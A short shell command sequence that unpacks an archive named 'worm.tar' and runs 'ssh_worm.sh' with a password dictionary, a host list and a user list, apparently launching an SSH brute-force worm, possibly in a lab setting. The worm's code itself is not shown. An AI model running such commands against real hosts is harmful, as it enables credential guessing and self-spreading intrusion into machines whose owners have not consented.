tar xvf worm.tar worm
chmod 755 worm/ssh_worm.sh
touch already.txt
./worm/ssh_worm.sh worm/dict.txt worm/host_node1.txt worm/user.txt
